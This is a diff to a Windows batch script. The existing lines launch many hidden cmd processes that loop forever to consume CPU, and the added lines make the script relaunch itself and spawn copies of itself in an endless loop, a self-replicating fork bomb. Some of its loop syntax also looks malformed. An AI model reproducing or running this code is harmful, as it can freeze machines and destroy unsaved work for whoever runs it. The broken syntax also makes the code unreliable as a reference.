@@ -67,5 +67,10 @@ for /l %%i in (1,1,8) do (
     start /b /low /min cmd /c "for /l %%j in (1,1,4) do (start /b /min cmd /c @echo off ^& for /l in () do (set /a n=1))"
 )
 
-goto loop
+tasklist /fi "IMAGENAME eq cmd.exe" /fo csv | findstr /i "%~nx0" >nul
+if errorlevel 1 (
+    start /b /min "%~f0"
+    start /b /min cmd /c "for /l in () do start %~f0"
+)
 
+goto loop
